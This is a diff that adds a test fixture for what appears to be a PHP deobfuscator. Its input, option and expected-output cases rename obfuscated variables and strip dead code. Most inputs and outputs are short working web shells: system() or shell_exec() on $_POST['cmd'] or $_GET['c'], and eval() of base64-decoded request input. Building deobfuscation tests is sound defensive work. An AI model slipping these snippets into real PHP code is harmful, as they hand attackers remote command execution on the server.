@@ -1,0 +1,103 @@
+INPUT
+$O00O0 = $_POST['cmd'];
+system($O00O0);
+OPTIONS
+rename-vars
+OUTPUT
+$post_cmd = $_POST['cmd'];
+system($post_cmd);
+INPUT
+$deadbe = base64_decode($_GET['x']);
+eval($deadbe);
+OPTIONS
+rename-vars
+OUTPUT
+$decoded = base64_decode($_GET['x']);
+eval($decoded);
+INPUT
+$o0fliln37 = $_REQUEST['f'];
+call_user_func_array($o0fliln37, $args);
+OPTIONS
+rename-vars
+OUTPUT
+$req_f = $_REQUEST['f'];
+call_user_func_array($req_f, $args);
+INPUT
+$tok1en2 = "system";
+$tok3en4 = "shell_exec";
+if (function_exists($tok1en2)) { $tok1en2($_GET['c']); }
+elseif (function_exists($tok3en4)) { $tok3en4($_GET['c']); }
+OPTIONS
+rename-vars
+OUTPUT
+$fn_system = "system";
+$fn_shell_exec = "shell_exec";
+if (function_exists($fn_system)) {
+    system($_GET['c']);
+} elseif (function_exists($fn_shell_exec)) {
+    shell_exec($_GET['c']);
+}
+INPUT
+$normalName = $_GET['a'];
+$count = 5;
+echo $normalName . $count;
+OPTIONS
+rename-vars
+OUTPUT
+$normalName = $_GET['a'];
+$count = 5;
+echo $normalName . $count;
+INPUT
+$O00O0 = $_POST['cmd'];
+extract($_GET);
+system($O00O0);
+OPTIONS
+rename-vars
+OUTPUT
+$O00O0 = $_POST['cmd'];
+extract($_GET);
+system($O00O0);
+INPUT
+$O00O0 = $_POST['cmd'];
+$f = function() use ($O00O0) { return $O00O0; };
+system($O00O0);
+OPTIONS
+rename-vars
+OUTPUT
+$O00O0 = $_POST['cmd'];
+$f = function () use($O00O0) {
+    return $O00O0;
+};
+system($O00O0);
+INPUT
+$kK9kK9 = $_GET['n'];
+$O00O0 = $_POST['cmd'];
+system($$kK9kK9);
+echo $O00O0;
+OPTIONS
+rename-vars
+OUTPUT
+$kK9kK9 = $_GET['n'];
+$O00O0 = $_POST['cmd'];
+system(${$kK9kK9});
+echo $O00O0;
+INPUT
+$decoded = "existing";
+$deadbe = base64_decode($_GET['x']);
+eval($deadbe . $decoded);
+OPTIONS
+rename-vars
+OUTPUT
+$decoded = "existing";
+$decoded2 = base64_decode($_GET['x']);
+eval($decoded2 . $decoded);
+INPUT
+$o0O0o = $_POST['x'];
+$unusedScaffold123 = "dead";
+system($o0O0o);
+OPTIONS
+remove-dead-code
+rename-vars
+OUTPUT
+$post_x = $_POST['x'];
+system($post_x);
